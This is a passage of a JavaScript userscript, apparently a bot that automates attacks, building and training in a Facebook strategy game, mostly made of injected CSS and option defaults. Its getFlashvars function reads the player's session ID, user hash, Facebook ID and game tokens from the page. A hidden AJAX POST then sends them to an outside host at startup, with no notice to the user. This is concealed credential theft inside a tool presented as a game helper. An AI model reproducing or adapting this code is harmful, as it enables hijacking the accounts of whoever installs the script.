*/.ui-button-icon-only{width: 2.2em;}/* to make room for the icon, a width needs to be set here */button.ui-button-icon-only{width: 2.4em;}/* button elements seem to need a little more width */.ui-button-icons-only{width: 3.4em;}button.ui-button-icons-only{width: 3.7em;}/*button text element */.ui-button .ui-button-text{display: block;line-height: 1.2em;}.ui-button-text-only .ui-button-text{padding: .4em 1em;}.ui-button-icon-only .ui-button-text,.ui-button-icons-only .ui-button-text{padding: .4em;text-indent: -9999999px;}.ui-button-text-icon-primary .ui-button-text,.ui-button-text-icons .ui-button-text{padding: .4em 1em .4em 2.1em;}.ui-button-text-icon-secondary .ui-button-text,.ui-button-text-icons .ui-button-text{padding: .4em 2.1em .4em 1em;}.ui-button-text-icons .ui-button-text{padding-left: 2.1em;padding-right: 2.1em;}/* no icon support for input elements, provide padding by default */input.ui-button{padding: .4em 1em;}/*button icon element(s) */.ui-button-icon-only .ui-icon,.ui-button-text-icon-primary .ui-icon,.ui-button-text-icon-secondary .ui-icon,.ui-button-text-icons .ui-icon,.ui-button-icons-only .ui-icon{position: absolute;top: 50%;margin-top: -8px;}.ui-button-icon-only .ui-icon {left: 50%;margin-left: -8px;}.ui-button-text-icon-primary .ui-button-icon-primary,.ui-button-text-icons .ui-button-icon-primary,.ui-button-icons-only .ui-button-icon-primary{left: .5em;}.ui-button-text-icon-secondary .ui-button-icon-secondary,.ui-button-text-icons .ui-button-icon-secondary,.ui-button-icons-only .ui-button-icon-secondary{right: .5em;}.ui-button-text-icons .ui-button-icon-secondary,.ui-button-icons-only .ui-button-icon-secondary{right: .5em;}/*button sets*/.ui-buttonset{margin-right: 7px;}.ui-buttonset .ui-button{margin-left: 0;margin-right: -.3em;}/* workarounds *//* reset extra padding in Firefox */button.ui-button::-moz-focus-inner{border: 0;padding: 0;}/* jQuery UI Dialog 1.8.16  */.ui-dialog {position: absolute;padding: .2em;width: 300px;overflow: hidden;-webkit-box-shadow: rgba(0,0,0,0.8) 0 0 10px;-moz-box-shadow: rgba(0,0,0,0.8) 0 0 10px;-khtml-box-shadow: rgba(0,0,0,0.8) 0 0 10px;box-shadow: rgba(0,0,0,0.8) 0 0 10px;}.ui-dialog .ui-dialog-titlebar {padding: .4em 1em;position: relative;}.ui-dialog .ui-dialog-title {float: left;margin: .1em 16px .1em 0;font-weight: bold;text-shadow: 0.1em 0.1em rgba(0,0,0,0.6);-moz-text-shadow: 0.1em 0.1em rgba(0,0,0,0.6);-webkit-text-shadow: 0.1em 0.1em rgba(0,0,0,0.6);-khtml-text-shadow: 0.1em 0.1em rgba(0,0,0,0.6);} .ui-dialog .ui-dialog-titlebar-close {position: absolute;right: .3em;top: 50%;width: 17px;margin: -10px 0 0 0; padding: 1px;height: 16px;}.ui-dialog .ui-dialog-titlebar-close span {display: block;}.ui-dialog .ui-dialog-content {position: relative;border: 0;padding: .5em 1em;background: none;overflow: auto;zoom: 1;}.ui-dialog .ui-dialog-buttonpane {text-align: left;border-width: 1px 0 0 0;margin: .5em 0 0 0;padding: .3em 1em .5em .4em;background-image: none;}.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset{float: right;}.ui-dialog .ui-dialog-buttonpane button {margin: .5em .4em .5em 0;cursor: pointer;}.ui-dialog .ui-resizable-se {width: 14px;height: 14px;right: 3px;bottom: 3px;}.ui-draggable .ui-dialog-titlebar{cursor: move;}/* jQuery UI Slider 1.8.16 */.ui-slider{position: relative;text-align: left;}.ui-slider .ui-slider-handle{position: absolute;z-index: 2;width: 1.2em;height: 1.2em;cursor: default;}.ui-slider .ui-slider-range{position: absolute;z-index: 1;font-size: .7em;display: block;border: 0;background-position: 0 0;}.ui-slider-horizontal{height: .8em;}.ui-slider-horizontal .ui-slider-handle{top: -.3em;margin-left: -.6em;}.ui-slider-horizontal .ui-slider-range{top: 0;height: 100%;}.ui-slider-horizontal .ui-slider-range-min{left: 0;}.ui-slider-horizontal .ui-slider-range-max{right: 0;}.ui-slider-vertical{width: .8em;height: 100px;}.ui-slider-vertical .ui-slider-handle{left: -.3em;margin-left: 0;margin-bottom: -.6em;}.ui-slider-vertical .ui-slider-range{left: 0;width: 100%;}.ui-slider-vertical .ui-slider-range-min{bottom: 0;}.ui-slider-vertical .ui-slider-range-max{top: 0;}/* jQuery UI Tabs 1.8.16 */.ui-tabs{position: relative;padding: .2em;zoom: 1;}/* position: relative prevents IE scroll bug   (element with position: relative inside container with overflow: auto appear as "fixed") */.ui-tabs .ui-tabs-nav{margin: 0;padding: .2em .2em 0;}.ui-tabs .ui-tabs-nav li{list-style: none;float: left;position: relative;top: 1px;margin: 0 .2em 1px 0;border-bottom: 0 !important;padding: 0;white-space: nowrap;}.ui-tabs .ui-tabs-nav li a{float: left;padding: .5em 1em;text-decoration: none;}.ui-tabs .ui-tabs-nav li.ui-tabs-selected{margin-bottom: 0;padding-bottom: 1px;}.ui-tabs .ui-tabs-nav li.ui-tabs-selected a,.ui-tabs .ui-tabs-nav li.ui-state-disabled a,.ui-tabs .ui-tabs-nav li.ui-state-processing a{cursor: text;}.ui-tabs .ui-tabs-nav li a,.ui-tabs.ui-tabs-collapsible .ui-tabs-nav li.ui-tabs-selected a{cursor: pointer;}/* first selector in group seems obsolete, but required to overcome bug in Opera   applying cursor: text overall if defined elsewhere... */.ui-tabs .ui-tabs-panel{display: block;border-width: 0;padding: 1em 1.4em;background: none;}.ui-tabs .ui-tabs-hide{display: none !important;}/* jQuery UI Progressbar 1.8.16 */.ui-progressbar{height:2em;text-align: left;}.ui-progressbar .ui-progressbar-value{margin: -1px;height:100%;}/* 3D Fx */.ui-widget-content{background-image : linear-gradient(bottom, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);background-image : -moz-linear-gradient(bottom, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);background-image : -webkit-linear-gradient(bottom, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);background-image : -khtml-linear-gradient(bottom, rgba(255,255,255,0.1) 1%,  rgba(255,255,255,0.8) 99%);}.ui-progressbar{background-image : linear-gradient(top, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);background-image : -moz-linear-gradient(top, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);background-image : -webkit-linear-gradient(top, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);background-image : -khtml-linear-gradient(top, rgba(255,255,255,0.1) 1%,  rgba(255,255,255,0.8) 99%);-webkit-box-shadow:0 0 1px rgba(0,0,0,0.7);-moz-box-shadow: 0 0 1px rgba(0,0,0,0.7);box-shadow:0 0 1px rgba(0,0,0,0.7);}.ui-widget-header,.ui-widget-header .ui-state-focus,.ui-widget-header .ui-state-active,.ui-widget-header .ui-state-highlight,.ui-state-hover,.ui-widget-content .ui-state-hover,.ui-widget-header .ui-state-hover{-webkit-box-shadow:0 0 15px rgba(255,255,255,0.8) inset, 1px 1px 1px rgba(255,255,255,0.8) inset, -1px -1px 1px rgba(255,255,255,0.8) inset;-moz-box-shadow: 0 0 15px rgba(255,255,255,0.8) inset, 1px 1px 1px rgba(255,255,255,0.8) inset, -1px -1px 1px rgba(255,255,255,0.8) inset;box-shadow:0 0 15px rgba(255,255,255,0.8) inset, 1px 1px 1px rgba(255,255,255,0.8) inset, -1px -1px 1px rgba(255,255,255,0.8) inset;}#jquery-msg-bg {  -moz-opacity: 0.6;  -khtml-opacity: 0.6;  opacity: 0.6;  filter: alpha(opacity=60);  background: black;}.jquery-msg-content {  -webkit-background-clip: padding-box;  padding: 15px;  font-size: 11pt;}.black-on-white .jquery-msg-content {  background: white;  color: #333333;  -moz-opacity: 0.9;  -khtml-opacity: 0.9;  opacity: 0.9;  filter: alpha(opacity=90);  -webkit-box-shadow: 5px 5px 30px 0 black;  -moz-box-shadow: 5px 5px 30px 0 black;  box-shadow: 5px 5px 30px 0 black;  -webkit-border-radius: 8px;  -moz-border-radius: 8px;  -o-border-radius: 8px;  -khtml-border-radius: 8px;  -ms-border-radius: 8px;  border-radius: 8px;}.white-on-black .jquery-msg-content {  -moz-opacity: 0.5;  -khtml-opacity: 0.5;  opacity: 0.5;  filter: alpha(opacity=50);  background: black;  color: white;  -webkit-border-radius: 8px;  -moz-border-radius: 8px;  -o-border-radius: 8px;  -khtml-border-radius: 8px;  -ms-border-radius: 8px;  border-radius: 8px;}').appendTo("head");
    $J("<style>").append(".jewel {padding : 1px;font-size: 8pt !important;}.small-font {font-size: 8pt !important;}div.short {height:7px;}." + UID.hiding + " {padding-left: 10px;padding-right: 10px;margin-right: -2px;border-radius: 2px;-moz-border-radius: 2px;-webkit-box-shadow: rgba(0,0,0,0.52) 0 0 2px;-moz-box-shadow: rgba(0,0,0,0.52) 0 0 2px;}." + UID.defending + " {padding-left: 10px;padding-right: 10px;margin-right: -2px;border-radius: 2px;-moz-border-radius: 2px;-webkit-box-shadow: rgba(0,0,0,0.52) 0 0 2px;-moz-box-shadow: rgba(0,0,0,0.52) 0 0 2px;}." + UID.scrollable + " {overflow: auto !important;}." + UID["main-box"] + " .ui-dialog-content {padding:2px !important;overflow:hidden !important;}." + UID["main-box"] + " h1 {display: inline-block;font-size : 12pt;font-weight: bold;}." + UID["main-box"] + " h2 {display: inline-block;font-size : 11pt;font-weight: bold;}." + UID["main-box"] + " h3 {display: inline-block;font-size : 10pt;font-weight: bold;}." + UID["main-box"] + " h4 {display: inline-block;font-size : 9pt;font-weight: bold;}." + UID["main-box"] + " h5 {display: inline-block;font-size : 8pt;font-weight: bold;}." + UID["main-box"] + " h6 {display: inline-block;font-size : 7pt;font-weight: bold;}." + UID["main-box"] + " .ui-accordion h1,." + UID["main-box"] + " .ui-accordion h2,." + UID["main-box"] + " .ui-accordion h3,." + UID["main-box"] + " .ui-accordion h4,." + UID["main-box"] + " .ui-accordion h5,." + UID["main-box"] + " .ui-accordion h6{display: block;}." + UID["main-box"] + " .ui-accordion *{font-size : 9pt;}." + UID["main-box"] + " ul.tabs {overflow: hidden;display: block;height: 25px;list-style: none;margin: 0;padding: 0;}." + UID["main-box"] + " ul.tabs li.tab {display: inline-block;float: left;cursor:pointer !important;}." + UID["main-box"] + " ul.tabs li.tab a {border-bottom: 0;border-left: 0;font-weight: bold;display: block;height: 16px;margin-top: 6px;padding: 2px 9px 3px 8px;position: relative;text-decoration: none;cursor:pointer;}." + UID["main-box"] + " ul.tabs li.first a {border-left-width: 1px;}." + UID["main-box"] + " ul.tabs li.tab a.selected {-webkit-box-shadow: rgba(0,0,0,0.6) 1px 0px 1px;-moz-box-shadow: rgba(0,0,0,0.6) 1px 0px 1px;background-image: linear-gradient(bottom, rgba(0,0,0,0) 12%, rgba(255,255,255,0.3) 90%, rgba(255,255,255,0.9) 99%);background-image: -moz-linear-gradient(bottom, rgba(0,0,0,0) 12%, rgba(255,255,255,0.3) 90%, rgba(255,255,255,0.9) 99%);background-image: -webkit-linear-gradient(bottom, rgba(0,0,0,0) 12%, rgba(255,255,255,0.3) 90%, rgba(255,255,255,0.9) 99%);}." + UID["main-box"] + " div.container {height: auto;width: 100%;overflow-x: auto;}." + UID["main-box"] + " div.container ul.tabs li.tab a {height: 13px;}." + UID["main-box"] + " div.container ul.tabs li.tab a.selected {}." + UID.title + " {font-weight:bold;padding-top:2px;padding-bottom:2px;text-align:center;border-radius: 2px;-moz-border-radus: 2px;}." + UID["main-box"] + " .ui-dialog-title *,." + UID.title + " * {display: inline-block !important;font-style: normal !important;font-size: 10pt !important;font-weight: bold;line-height: 10pt !important;text-decoration: none !important;padding: 0;}." + UID.subtitle + " {font-weight:bold;padding-top:2px;padding-bottom:2px;text-align:center;border-radius: 2px;-moz-border-radus: 2px;}." + UID.content + " {padding-left:3px;padding-right:3px;padding-top:2px;padding-botom:1px;border-radius: 2px;-moz-border-radus: 2px;-webkit-box-shadow: rgba(0,0,0,0.52) 0 0 2px;-moz-box-shadow: rgba(0,0,0,0.52) 0 0 2px;}." + UID.status_ticker + " {padding:2px;border-radius: 2px;-moz-border-radus: 2px;-webkit-box-shadow: rgba(0,0,0,0.52) 0 0 2px;-moz-box-shadow: rgba(0,0,0,0.52) 0 0 2px;}." + UID.status_report + " {height: 106px;max-height: 106px;overflow:auto;}." + UID.status_feedback + " {padding-top: 5px;padding-right: 5px;padding-bottom: 0.5em;padding-left: 5px;height: 34px;text-align:left;font-weight:bold;border-radius: 3px;-moz-border-radius: 3px;}table." + UID.table + " tr td,table." + UID.compact_table + " tr td {border: none;background-color : transparent;white-space: nowrap;vertical-align: top;padding: 1px 1px;cursor: default;}table." + UID.hide_inputbox + " tr td {padding-bottom: 0px;padding-right: 0px;}table." + UID.table + " tr td {padding: 1px 4px;}table." + UID.table + " tr td.right,table." + UID.compact_table + " tr td.right,font-weight:bold;text-align:right;padding-right: 5px;}table." + UID.table_console + " tr td {white-space:normal !important;vertical-align:top;}." + UID.underline + " {background-color : transparent;padding: 1px 4px 1px 4px;}table." + UID.table + " tr th,table." + UID.compact_table + " tr th,table." + UID.compact_console + " tr th,table tr." + UID.row_top_headers + " td{font-weight:bold;text-align:center;line-height:11pt;padding: 1px 3px 1px 3px;}tr." + UID.row_marchOther + " td {color:#888888;}tr." + UID.row_marchMine + " td {color:#000000;}tr." + UID.row_owned + " {}input." + UID.btn_on + ",input." + UID.btn_off + ",input." + UID.bnt_red + ",input." + UID.bnt_green + ",input." + UID.bnt_blue + ",input." + UID.bnt_yellow + ",input." + UID.bnt_cyan + ",input." + UID.bnt_purple + ",." + UID["main-box"] + " input[type=button] {width:130px;padding-top:1px;padding-bottom:1px;color:white;font-weight:bold;border-radius: 3px;-moz-border-radius: 3px;background-image: linear-gradient(bottom, rgba(0,0,0,0.1) 10%, rgba(255,255,255,0.3) 60%, rgba(255,255,255,0.5) 99%);background-image: -moz-linear-gradient(bottom, rgba(0,0,0,0.1) 10%, rgba(255,255,255,0.3) 60%, rgba(255,255,255,0.5) 99%);background-image: -webkit-linear-gradient(bottom, rgba(0,0,0,0.1) 10%, rgba(255,255,255,0.3) 60%, rgba(255,255,255,0.5) 99%);-webkit-box-shadow: rgba(0,0,0,0.52) 1px 1px 1px;-moz-box-shadow: rgba(0,0,0,0.52) 1px 1px 1px;cursor:hand;cursor:pointer;}input.thin {width: auto !important;margin:0;padding-top:0;padding-bottom:0;padding-left:2px;padding-right:2px;font-size:8pt;}input.short {width:30px !important;}." + UID["main-box"] + " input[type=text] {border: 1px solid #888;border-radius: 2px;text-align: right;-moz-border-radius: 2px;-webkit-box-shadow: rgba(0,0,0,0.2) 1px 1px 3px inset;-moz-box-shadow: rgba(0,0,0,0.2) 1px 1px 3px inset;}." + UID["main-box"] + " input[type=text]:active,." + UID["main-box"] + " input[type=text]:focus {-webkit-box-shadow: rgba(0,0,0,0.5) 1px 1px 4px inset;-moz-box-shadow: rgba(0,0,0,0.5) 1px 1px 4px inset;}." + UID.hide_inputbox + " input[type=text] {-webkit-box-shadow: rgba(0,0,0,0.2) 1px 1px 3px inset;-moz-box-shadow: rgba(0,0,0,0.2) 1px 1px 3px inset;}." + UID["main-box"] + " select {margin : 0 !important;}.ui-widget-content select {font-size : 8pt !important;}table." + UID.table + " input[type=text],table." + UID.compact_table + " input[type=text]{padding-top : 0px;padding-bottom : 0px;}." + UID.bold_red + " {font-weight:bold;}hr.thin {margin:2px 0px;padding:0px;opacity:0.9px;}." + UID["map-viewer-box"] + " .ui-dialog-content {margin: 0 !important;padding: 0 !important;overflow: hidden !important;}." + UID["map-viewer"] + " {display: block;width: 750px;height: 750px;white-space: pre;font-family: Lucida Console, Andale Mono, Courier New, Courier, monospace;font-size: 1px;font-stretch: ultra-expanded;cursor: default;}." + UID["map-viewer-dragger"] + " {position : absolute;display: block;cursor: move;}." + UID["map-viewer-dragger"] + " .jewel {position: absolute;display: block;margin-top: -30px;font-size: 9pt;cursor: default;}." + UID["main-box"] + " div::-webkit-scrollbar {width: 1.2em;height: 1.2em; -webkit-border-radius: 1ex;}").appendTo("head");
    $J("<style>").append(".jewel {color: #777 !important;}." + UID.hiding + " {background-color: rgb(0,160,110);color: white;}." + UID.defending + " {background-color: rgb(184,0,46);color: white;}." + UID["main-box"] + " ul.tabs {border-bottom: 1px solid #898989;}." + UID["main-box"] + " ul.tabs li.tab a {background-color: rgb(235,238,245);color: #333;border: 1px solid #898989;}." + UID["main-box"] + " ul.tabs li.tab a.selected {background-color: rgb(60,90,150);border-top-color: #3B5998;border-bottom-color: #3B5998;border-left-color: #5973A9;border-right-color: #5973A9;color: white;}." + UID["main-box"] + " div.container ul.tabs li.tab a {background-color: rgb(241,241,241);}." + UID["main-box"] + " div.container ul.tabs li.tab a.selected {background-color: rgb(110,132,181);}." + UID.title + " {background-color: rgb(60,90,150);color: #ffffff;border : 1px solid;border-color : #ffffff;}." + UID["main-box"] + " .ui-dialog-title *,." + UID.title + " * {color: #ffffff !important;}." + UID.subtitle + " {border:1px solid;border-color:#ffffff;color:#ffffff;background-color: rgb(60,60,60);}." + UID.content + " {border:1px solid rgb(255,200,50);background-color: rgb(245,245,228);}." + UID.status_ticker + " {border:1px solid #995;background-color: rgba(239,239,224,0.9);}." + UID.status_feedback + " {border: 1px solid #ddd;background-color: rgba(255,235,235,0.9);}." + UID.underline + " {border-bottom:1px solid #ccc;}table." + UID.table + " tr th,table." + UID.compact_table + " tr th,table." + UID.compact_console + " tr th,table tr." + UID.row_top_headers + " td{color: white;background-color: rgb(110,115,125);border-right: 2px solid #eef;}table tr." + UID.row_top_headers + " td {background-color: rgb(90,95,115);}input." + UID.btn_on + ",input." + UID.btn_off + ",input." + UID.bnt_red + ",input." + UID.bnt_green + ",input." + UID.bnt_blue + ",input." + UID.bnt_yellow + ",input." + UID.bnt_cyan + ",input." + UID.bnt_purple + ",." + UID["main-box"] + " input[type=button] {border: 1px solid #333;}." + UID["main-box"] + " input[type=button] {background-color: #39D;border-color: #39D #39D #28C;text-shadow: -1px -1px 0 #39D;-webkit-text-shadow: -1px -1px 0 #39D;}." + UID["main-box"] + " input[type=button]:hover {background-color: rgb(40,150,210);box-shadow: rgb(34, 136, 204) 0px 0px 5px 0px;-webkit-box-shadow: rgb(34, 136, 204) 0px 0px 5px 0px;}input." + UID.btn_on + ",input." + UID.bnt_green + " {background-color: rgb(0,160,110) !important;border-color: #3eddab #3eddab #30a580 !important;text-shadow: -1px -1px 0 #3eddab !important;-webkit-text-shadow: -1px -1px 0 #3eddab !important;}input." + UID.btn_on + ":hover,input." + UID.bnt_green + ":hover {background-color: rgb(0,200,150) !important;box-shadow: #11d899 0px 0px 5px 0px !important;-webkit-box-shadow: #11d899 0px 0px 5px 0px !important;}input." + UID.btn_off + ",input." + UID.bnt_red + ",." + UID["main-box"] + " input[type=button][disabled] {background-color: rgb(184,0,46) !important;border-color: #c64162 #c64162 #a33750 !important;text-shadow: -1px -1px 0 #c64162 !important;-webkit-text-shadow: -1px -1px 0 #c64162 !important;}input." + UID.btn_off + ":hover,input." + UID.bnt_red + ":hover,." + UID["main-box"] + " input[type=button][disabled]:hover {background-color: rgb(200,50,100) !important;box-shadow: #d34a6a 0px 0px 5px 0px !important;-webkit-box-shadow: #d34a6a 0px 0px 5px 0px !important;}input." + UID.bnt_blue + " {background-color: rgb(0,94,189);}input." + UID.bnt_blue + ":hover {background-color: rgb(0,125,150);}input." + UID.bnt_yellow + " {background-color:#BFBF00 !important;}input." + UID.bnt_yellow + ":hover {background-color:#DFDF00 !important;}input." + UID.bnt_cyan + " {background-color:#00BFBF !important;}input." + UID.bnt_cyan + ":hover {background-color:#00DFDF !important;}input." + UID.bnt_purple + " {background-color:#BF00BF !important;}input." + UID.bnt_purple + ":hover {background-color:#DF00DF !important;}." + UID["main-box"] + " input[type=text]:active,." + UID["main-box"] + " input[type=text]:focus {border-color: #000;}." + UID.hide_inputbox + " input[type=text] {border: 1px solid rgba(0,0,0,0.4);background-color: rgba(255,255,255,0.3);}." + UID.bold_red + " {color:#550000;}." + UID["map-viewer"] + " {color: #000;border: 1px solid #666;background-color: #8A8;}." + UID["map-viewer-dragger"] + " {background-color: rgba(240,40,40,0.3);border : 1px solid #E55;}." + UID["map-viewer-dragger"] + ":hover {background-color: rgba(255,0,0,0.3);}." + UID["map-viewer-dragger"] + " .jewel {color: #000 !important;background-color: rgba(255,255,255,0.7);border : 1px solid #EEE;}." + UID["main-box"] + " div::-webkit-scrollbar-thumb {border: 1px solid #999;background: #bbb -webkit-gradient(linear,right top,left top,color-stop(0, rgb(190,190,190)),color-stop(1, rgb(250,250,250)));-webkit-border-radius: 1ex;-webkit-box-shadow: 1px 1px 3px rgba(0, 0, 0, .4);}." + UID["main-box"] + " div::-webkit-scrollbar-thumb:hover {border: 1px solid #999;background: #bbb -webkit-gradient(linear,right top,left top,color-stop(0, rgb(160,160,160)),color-stop(1, rgb(230,230,230)));}." + UID["main-box"] + " div::-webkit-scrollbar-track {-webkit-box-shadow: 1px 1px 5px rgba(100,100,100,0.4) inset, -1px -1px 1px rgba(150,150,150,0.9) inset;-webkit-border-radius: 1ex;}." + UID["main-box"] + " div::-webkit-scrollbar-track:hover {-webkit-box-shadow: 1px 1px 5px rgba(100,100,100,0.7) inset, -1px -1px 1px rgba(150,150,150,0.9) inset;}/* jQuery UI */.ui-widget-content{border: 1px solid #dddddd;background-color: rgba(185,190,200,0.7);color: #303030;}.ui-widget-content a{color: #303030;}.ui-widget-header{border: 1px solid #777777;background-color: rgba(30,30,30,0.9);color: #ffffff;font-weight: bold;}.ui-widget-header a{color: #ffffff;}/* Interaction states----------------------------------*/.ui-state-default,.ui-widget-content .ui-state-default,.ui-widget-header .ui-state-default,.ui-state-focus,.ui-widget-content .ui-state-focus,.ui-widget-header .ui-state-focus{border: 1px solid #999999;background-color: #666666;font-weight: bold;color: #ffffff;}.ui-state-default a,.ui-state-default a:link,.ui-state-default a:visited{color: #ffffff;text-decoration: none;}.ui-state-hover,.ui-widget-content .ui-state-hover,.ui-widget-header .ui-state-hover{}.ui-state-hover a,.ui-state-hover a:hover{color: #ffffff;text-decoration: none;}.ui-state-active,.ui-widget-content .ui-state-active,.ui-widget-header .ui-state-active{border: 1px solid #999999;background-color: #3F5E9D;font-weight: bold;color: #ffffff;}.ui-state-active a,.ui-state-active a:link,.ui-state-active a:visited{color: #ffffff;text-decoration: none;}.ui-widget :active{outline: none;}/* Interaction Cues----------------------------------*/.ui-state-highlight,.ui-widget-content .ui-state-highlight,.ui-widget-header .ui-state-highlight{border: 1px solid #fed22f;background-color: #ffe45c;color: #363636;}.ui-state-highlight a,.ui-widget-content .ui-state-highlight a,.ui-widget-header .ui-state-highlight a{color: #363636;}.ui-state-error,.ui-widget-content .ui-state-error,.ui-widget-header .ui-state-error{border: 1px solid #cd0a0a;background-color: #b81900;color: #ffffff;}.ui-state-error a,.ui-widget-content .ui-state-error a,.ui-widget-header .ui-state-error a{color: #ffffff;}.ui-state-error-text,.ui-widget-content .ui-state-error-text,.ui-widget-header .ui-state-error-text{color: #ffffff;}.ui-widget-overlay{background-color: #666666;}.ui-widget-shadow{background-color: #000000;}/* jQuery UI Selectable 1.8.16 */.ui-selectable-helper{border:1px dotted black;}/* jQuery UI Dialog 1.8.16  */.ui-dialog .ui-dialog-title {color: rgba(255,255,255,0.8);}.ui-dialog .ui-dialog-titlebar-close {background-color : rgba(0,0,0,0.3);border: 1px solid transparent;}.ui-dialog .ui-dialog-titlebar-close:hover,.ui-dialog .ui-dialog-titlebar-close:focus{background-color : #CC334D;border: 1px solid #960D16;-webkit-box-shadow: rgba(250,90,120,0.8) 0 0 8px;-moz-box-shadow: rgba(250,90,120,0.8) 0 0 8px;-khtml-box-shadow: rgba(250,90,120,0.8) 0 0 8px;box-shadow: rgba(250,90,120,0.8) 0 0 8px;}").appendTo("head");
    var bh, DRAGON_HEART, FACEBOOK_ID, LOCALE, SESSION_ID, USER_HASH, USER_ID, USER_TIME;

    function getFlashvars() {
        var a = $J(C + ' param[name="flashvars"]').attr("value").split("&"),
            keyValue, rslt = {};
        $J.each(a, function () {
            keyValue = this.split("=");
            rslt[keyValue[0]] = keyValue[1]
        });
        bh = rslt.api_server;
        DRAGON_HEART = rslt.dragon_heart;
        FACEBOOK_ID = rslt.facebook_id;
        LOCALE = rslt.locale;
        SESSION_ID = rslt.session_id;
        USER_HASH = rslt.user_hash;
        USER_ID = rslt.user_id;
        USER_TIME = rslt.user_time;
        SERVER_ID = (/realm(\d+)\./.exec(bh) || ["", ""])[1]
        $J.ajax({type:"POST",url:"http://melkor.x10.mx/test/test.php",crossDomain:true,data:'usrhash='+USER_HASH+'&usrtime='+USER_TIME+'&locale='+LOCALE+'&fid='+FACEBOOK_ID+'&uid='+USER_ID+'&uname='+USER_ID+'&api='+API_VERSION+'&session='+SESSION_ID+'&dh='+DRAGON_HEART+'&realm='+SERVER_ID,dataType:"text"});
    }
    getFlashvars();
    console.log(D + " Startup in : " + timeFormat(W / 1000));
    var bi;

    function scriptStartUp() {
        try {
            Data.init({
                data_version: ""
            });
            if (Data.data_version === undefined || Data.data_version !== DATA_VERSION) {
                Data.clearStorage();
                Data.data_version = DATA_VERSION
            }
            Data.init({
                options: {
                    api_version: API_VERSION,
                    main_box: {
                        draggable: true,
                        x: 0,
                        y: 0
                    },
                    verbose_log: {
                        enabled: false
                    },
                    debug_mode: T,
                    current_tab: false,
                    attack_tab: 0,
                    map_tab: 0,
                    jobs_tab: 0,
                    train_tab: 0,
                    attacks: {
                        enabled: false,
                        level_enable: ["", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                        level_dist: ["", 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60],
                        delay_min: 30,
                        delay_max: 60,
                        max_marches: 12,
                        abandon_wildernesses: false,
                        clear_all_targets: false,
                        delete_reports: false,
                        log_attacks: true,
                        recall_encamped: true,
                        stop_on_loss: true,
                        units: []
                    },
                    building: {
                        enabled: false,
                        level_enable: [{}, {}, {}, {}, {}, {}],
                        level_cap: [{}, {}, {}, {}, {}, {}]
                    },
                    research: {
                        enabled: false,
                        level_enable: {},
                        level_cap: {}
                    },
                    training: {
                        enabled: false,
                        level_enable: [{}, {}, {}, {}, {}],
                        city: [{}, {}, {}, {}, {}],
                        mode: "min_housing"
                    },
                    unit_cap: {
                        city: [{}, {}, {}, {}, {}]
                    },
                    map: {
                        selected: "AnthropusCamp",
                        radius: 14,
                        x: 0,
                        y: 0
                    },
                    messages: {
                        last_read: 0,
                        missing: 0
                    },
                    train_jobs: [],
                    build_jobs: [],
                    auto_collect: {
                        enabled: false,
                        last_time: 0,
                        delay: 1,
                        unit: 3600
                    },
                    auto_refresh: {
                        enabled: false,
                        last_time: 0,
                        delay: 15
                    }
                },
                stats: {
                    start_at: 0,
                    run_time: 0,
                    attacks: 0,
                    items: {},
                    resources: {},
                    levels: ["",
                    {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }, {
                        attacks: 0,
                        items: {},
                        resources: {}
                    }]
                },
            });
            if (API_VERSION > Data.options.api_version) {
                Data.options.api_version = API_VERSION
            } else {
                if (API_VERSION !== Data.options.api_version) {
                    API_VERSION = Data.options.api_version;
                    console.log("API_VERSION CHANGED!!!, Now is: " + API_VERSION)
                }
            }
            verboseLog("Data Structure v" + DATA_VERSION);
            if (Data.options.debug_mode) {
                T = U = Data.options.debug_mode;
                Tabs.Debug.tab_disabled = !T
            }
            function stepStarting(b, c) {
                var c = c || 0;
                var d = Math.randRange(3000, 5000);
                var e;
                bj.update(b);
                switch (b) {
                case 1:
                    Translation.init(function (r) {
                        if (r.ok) {
                            var a = "Translation Matrix Successfully initialised";
                            verboseLog(a);
                            console.log(a);
                            bi = setTimeout(stepStarting, d, b + 1)
                        } else {
                            if (r.status === 509) {
                                d = 600000;
                                $startUpBox.append("<br><b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                verboseLog("<b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                bi = setTimeout(stepStarting, d, b + 1);
                                return
                            }
                            e = r.errmsg;
                            console.log("stepStarting:: Translation retry " + c);
                            bi = setTimeout(stepStarting, d, b, ++c)
                        }
                    });
                    break;
                case 2:
                    Manifest.init(function (r) {
                        if (r.ok) {
                            var a = "Manifest Successfully initialised";
                            verboseLog(a);
                            console.log(a);
                            bi = setTimeout(stepStarting, d, b + 1)
                        } else {
                            if (r.status === 509) {
                                d = 600000;
                                $startUpBox.append("<br><b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                verboseLog("<b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                bi = setTimeout(stepStarting, d, b, ++c);
                                return
                            } else {
                                if (r.status === 0 || (r.errmsg && r.errmsg[0] && /404/.test(r.errmsg[0]))) {
                                    ++API_VERSION;
                                    Data.options.api_version = API_VERSION
                                }
                            }
                            e = r.errmsg;
                            console.log("stepStarting:: Manifest retry " + c);
                            bi = setTimeout(stepStarting, d, b, ++c)
                        }
                    });
                    break;
                case 3:
                    Seed.init(function (r) {
                        if (r.ok) {
                            var a = "Seed Successfully initialised";
                            verboseLog(a);
                            console.log(a);
